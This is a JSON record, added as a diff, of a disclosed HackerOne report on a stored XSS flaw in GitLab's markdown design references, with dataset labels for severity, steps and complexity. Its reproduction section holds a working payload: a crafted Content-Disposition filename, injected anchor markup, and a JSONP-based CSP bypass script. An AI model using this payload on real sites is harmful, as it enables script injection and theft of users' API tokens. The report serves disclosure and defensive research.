@@ -1,0 +1,57 @@
+{
+  "reported_to": "GitLab",
+  "reported_by": "vakzz ",
+  "title": "Stored XSS in markdown via the DesignReferenceFilter ",
+  "content": "\nSummary\nWhen rendering markdown, links to designs are parsed using the following link_reference_pattern:\nhttps://gitlab.com/gitlab-org/gitlab/-/blob/v13.12.1-ee/app/models/design_management/design.rb#L168\nCode 489 Bytes\n1    def self.link_reference_pattern\n2      @link_reference_pattern ||= begin\n3        path_segment = %r{issues/#{Gitlab::Regex.issue}/designs}\n4        ext = Regexp.new(Regexp.union(SAFE_IMAGE_EXT + DANGEROUS_IMAGE_EXT).source, Regexp::IGNORECASE)\n5        valid_char = %r{[^/\\s]} # any char that is not a forward slash or whitespace\n6        filename_pattern = %r{\n7          (?<url_filename> #{valid_char}+ \\. #{ext})\n8        }x\n9\n10        super(path_segment, filename_pattern)\n11      end\n12    end\nThe url_filename match is then used in parse_symbol:\nhttps://gitlab.com/gitlab-org/gitlab/-/blob/v13.12.1-ee/lib/banzai/filter/references/design_reference_filter.rb#L75\nCode 175 Bytes\n1def parse_symbol(raw, match_data)\n2  filename = match_data[:url_filename]\n3  iid = match_data[:issue].to_i\n4  Identifier.new(filename: CGI.unescape(filename), issue_iid: iid)\n5end\nSince valid_char is anything apart from a forward slash or whitespace, this allows for any other special characters (such as quotes) to be matched.\nThe final url match gets used when creating the link in object_link_filter:\nhttps://gitlab.com/gitlab-org/gitlab/-/blob/v13.12.1-ee/lib/banzai/filter/references/abstract_reference_filter.rb#L219\nCode 313 Bytes\n1url =\n2  if matches.names.include?(\"url\") && matches[:url]\n3    matches[:url]\n4  else\n5    url_for_object_cached(object, parent)\n6  end\n7\n8content = link_content || object_link_text(object, matches)\n9\n10link = %(<a href=\"#{url}\" #{data}\n11            title=\"#{escape_once(title)}\"\n12            class=\"#{klass}\">#{content}</a>)\nSo if a design could be uploaded with a double quote in it's filename, this would cause it to break out of the href attribute.\nNormally file uploads would go through workhorse and end up being sanitized by CarrierWave::SanitizedFile, but it's possible when uploading a design to skip the workhorse by using a Content-Disposition header such as Content-Disposition: form-data; name=\"1\"; filename*=ASCII-8BIT''filename.png which allows for any character to be used as part of the design filename.\nSince whitespaces and slashes are still invalid, it's only possible to inject tags without attributes, or inject attributed into the a element.\nInjecting attributes can be chained with the ReferenceRedactor to replace the node with arbitrary html via the data-original attribute:\nhttps://gitlab.com/gitlab-org/gitlab/-/blob/v13.12.1-ee/lib/banzai/reference_redactor.rb#L77\nCode 438 Bytes\n1def redacted_node_content(node)\n2  original_content = node.attr('data-original')\n3  link_reference = node.attr('data-link-reference')\n4\n5  # Build the raw <a> tag just with a link as href and content if\n6  # it's originally a link pattern. We shouldn't return a plain text href.\n7  original_link =\n8    if link_reference == 'true'\n9      href = node.attr('href')\n10      content = original_content\n11\n12      %(<a href=\"#{href}\">#{content}</a>)\n13    end\nFor a CSP bypass, the jsonp endpoint of the google api can be used in combination with setTimeout:\nhttps://apis.google.com/complete/search?client=chrome&q=alert(document.domain);//&callback=setTimeout\nSteps to reproduce\nCreate a new project on gitlab.com\nCreate a new issue\nMake sure burp or similar is running\nUpload a new design\nEdit the request and change the Content-Disposition header to Content-Disposition: form-data; name=\"1\"; filename*=ASCII-8BIT''bbb%22class%3D%22gfm%22a%3D%27.png\nRefresh the page, there should now be a design named bbb\"class=\"gfm\"a='.png\nCreate a new issue using the design link and the inner html containing a quote:\nCode 121 Bytes\n1<a href='https://gitlab.com/vakzz-h1/design-xss/-/issues/2/designs/bbb%22class%3D%22gfm%22a%3D%27.png'>\n2' vakzz=here\n3</a>\nLooking at the markup you can see the a attribute contains everything up to the inner html and then the attribute vakzz has also been injected:\nCode 575 Bytes\n1<a href=\"https://gitlab.com/vakzz-h1/design-xss/-/issues/2/designs/bbb\" class=\"gfm\" a=\".png&quot; data-original=&quot;\n2' vakzz=here\n3&quot; data-link=&quot;true&quot; data-link-reference=&quot;true&quot; data-project=&quot;26924211&quot; data-design=&quot;226146&quot; data-issue=&quot;87875440&quot; data-reference-type=&quot;design&quot; data-container=&quot;body&quot; data-placement=&quot;top&quot;\n4                          title=&quot;bbb&quot;class=&quot;gfm&quot;a='.png&quot;\n5                          class=&quot;gfm gfm-design has-tooltip&quot;>\n6\" vakzz=\"here\"></a>\nCreate a new issue using the design link, this time including the required data attributed to trigger the ReferenceRedactor and the payload html encoded in the data-original:\nCode 322 Bytes\n1<a href='https://gitlab.com/vakzz-h1/design-xss/-/issues/2/designs/bbb%22class%3D%22gfm%22a%3D%27.png'>\n2' data-design=\"1\" data-issue=\"1\" data-reference-type=\"design\" data-original=\"\n3  &lt;script src='https://apis.google.com/complete/search?client=chrome&q=alert(document.domain);//&callback=setTimeout'>&lt;/script>\n4\"\n5</a>\nSave the issue and reload the page\nImpact\nStored XSS with CSP bypass allowing arbitrary javascript to be run anywhere that markdown could be posted (issues, comments, etc). This could be used to create and exfiltrate api tokens with full access as described in https://hackerone.com/reports/1122227 targeting individuals or specific projects.\nExamples\nPOC:\nhttps://gitlab.com/vakzz-h1/design-xss/-/issues/3\nWhat is the current bug behavior?\nThe AbstractReferenceFilter is generating the link using string interpolation but the url could contain double quotes\nThe design model can have an arbitrary` attribute\nWhat is the expected correct behavior?\nThe url should be validated or escaped before being used\nThe design model could probably have a validator for the filename\nRelevant logs and/or screenshots\nOutput of checks\nThis bug happens on GitLab.com\nImpact\nStored XSS with CSP bypass allowing arbitrary javascript to be run anywhere that markdown could be posted (issues, comments, etc). This could be used to create and exfiltrate api tokens with full access as described in https://hackerone.com/reports/1122227 targeting individuals or specific projects.\n\n",
+  "severity": [
+    9.6,
+    null
+  ],
+  "bounty": 16000,
+  "weaknesses": [
+    "Cross-site Scripting (XSS) - Stored"
+  ],
+  "screenshots": {},
+  "disclosed_date": 1634550540,
+  "report_url": "https://hackerone.com/reports/1212067",
+  "is_multi_component": true,
+  "complexity": "HIGH",
+  "novelty": "HIGH",
+  "vuln_category": "WEB_APP",
+  "steps": [
+    [
+      1,
+      "Create a new project on GitLab.com and a new issue."
+    ],
+    [
+      2,
+      "Upload a design while modifying the Content-Disposition header to include a malicious filename with quotes."
+    ],
+    [
+      3,
+      "Create a new issue using the design link with crafted markdown to inject attributes into the HTML link element."
+    ],
+    [
+      4,
+      "Use the ReferenceRedactor feature to replace the node with arbitrary HTML via the data-original attribute."
+    ],
+    [
+      5,
+      "Include a CSP bypass payload using a JSONP endpoint to execute arbitrary JavaScript."
+    ]
+  ],
+  "vuln_description": "A stored XSS vulnerability in GitLab's markdown rendering allows an attacker to inject arbitrary JavaScript via specially crafted design filenames. The vulnerability stems from improper escaping of filenames in design references, which can break out of HTML attributes and be combined with the ReferenceRedactor feature to inject malicious scripts, bypassing CSP protections.",
+  "reason": "This vulnerability requires deep understanding of multiple components: markdown parsing, design reference handling, HTML attribute injection, and CSP bypass techniques. The attacker must chain these components together in a non-obvious way, manipulating both file upload behavior and markdown rendering logic.",
+  "new_complexity": "HIGH",
+  "requires_code": true,
+  "requires_CVE": false,
+  "is_ctf": false,
+  "other_report": "1122227",
+  "injection_metadata": {
+    "is_simple_payload": false
+  },
+  "authnz_metadata": {
+    "reason": "The vulnerability involves manipulating the filename in a design upload to inject malicious attributes into the rendered HTML. This is a stored XSS vulnerability that occurs during the markdown rendering process, which is part of the normal application flow. The methodology described involves testing for authorization boundaries by swapping user sessions and resource IDs, but this specific vulnerability does not require such swapping. Instead, it relies on injecting malicious content into a resource (the design filename) that is then rendered unsafely. The methodology does not explicitly cover testing for unsafe rendering of user-controlled input in this manner.",
+    "is_detectable": false
+  }
+}
